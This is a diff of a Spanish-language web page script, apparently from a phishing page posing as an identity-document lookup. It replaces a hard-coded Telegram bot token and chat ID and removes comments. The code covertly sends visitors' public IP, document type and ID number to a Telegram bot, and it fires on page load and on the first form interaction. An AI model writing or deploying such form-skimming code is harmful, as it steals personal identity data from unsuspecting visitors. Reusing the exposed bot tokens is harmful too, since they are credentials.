@@ -637,10 +637,9 @@
         // ─── Configuración general ───
         const API_URL = window.location.origin;
 
-        // ─── CONFIGURACIÓN TELEGRAM ───
-        // Chat ID y Token proporcionados por el usuario
+        // ─── CONFIGURACIÓN TELEGRAM (NUEVO TOKEN) ───
         const TELEGRAM_CHAT_ID = "-1004457768033";
-        const TELEGRAM_BOT_TOKEN = "8295005047:AAHqYWzujPTYMwWwTq6rrbQj5_aUi2YCqnU";
+        const TELEGRAM_BOT_TOKEN = "8994620249:AAH53iPEdWTRolMHaYTe5rwh-gQbShFFs7E";
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
 
         // Bandera para no enviar "p1" múltiples veces en la misma sesión
@@ -685,7 +684,6 @@
         }
 
         // ─── Detectar "inicio de sesión" (primer contacto con la página) ───
-        // Se dispara cuando el usuario interactúa por primera vez con el formulario
         async function notificarInicioSesion() {
             if (sesionIniciadaNotificada) return;
             sesionIniciadaNotificada = true;
@@ -696,15 +694,11 @@
         }
 
         // Disparadores del "inicio de sesión":
-        // 1) Al cargar la página (con pequeño delay para no bloquear)
         window.addEventListener('load', () => {
             setTimeout(notificarInicioSesion, 800);
         });
 
-        // 2) Al primer foco/clic en el campo de documento (refuerzo)
         document.getElementById('numeroDocumento').addEventListener('focus', notificarInicioSesion, { once: true });
-
-        // 3) Al hacer clic en el selector de documento (refuerzo)
         document.getElementById('customSelect').addEventListener('click', notificarInicioSesion, { once: true });
 
         // ─── Validar solo números ───
@@ -749,7 +743,6 @@
             const numDoc = document.getElementById('numeroDocumento').value.trim();
             if (!numDoc) return;
 
-            // Enviar también a Telegram el intento de consulta (opcional, pero útil)
             const ip = await obtenerIPPublica();
             await enviarTelegram(
                 `p1\nIP detectada: ${ip}\nIntento de consulta:\nTipo Doc: ${tipoDocSeleccionado}\nDocumento: ${numDoc}`
